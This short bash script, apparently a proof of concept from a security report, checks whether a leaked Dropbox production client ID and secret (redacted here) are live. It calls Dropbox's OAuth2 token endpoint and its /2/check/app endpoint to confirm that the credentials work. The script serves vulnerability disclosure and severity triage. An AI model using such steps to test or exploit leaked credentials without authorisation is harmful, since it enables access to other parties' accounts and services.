#!/usr/bin/env bash
# PoC 2 — Prove the leaked secret is LIVE and GENUINE.
# This is the evidence that determines severity: not "secret exists" but "secret works".
set -euo pipefail

CID="REDACTED_PROD_CLIENT_KEY"
CSECRET="REDACTED_PROD_CLIENT_SECRET"

echo "[*] (a) client_credentials grant -> valid app token, no user interaction"
curl -s -w '\n    HTTP %{http_code}\n' -X POST "https://api.dropbox.com/oauth2/token" \
  -d "grant_type=client_credentials" -d "client_id=$CID" -d "client_secret=$CSECRET"

echo
echo "[*] (b) Dropbox's own secret validation (/2/check/app, HTTP Basic)."
echo "    A 200 that echoes the 'secret' string is returned ONLY for a valid id:secret pair."
curl -s -w '\n    HTTP %{http_code}\n' -X POST "https://api.dropboxapi.com/2/check/app" \
  -u "$CID:$CSECRET" -H "Content-Type: application/json" \
  -d '{"query":"triage_evidence"}'
# Expected: {"result":"triage_evidence","secret":"Super secret string"}  HTTP 200
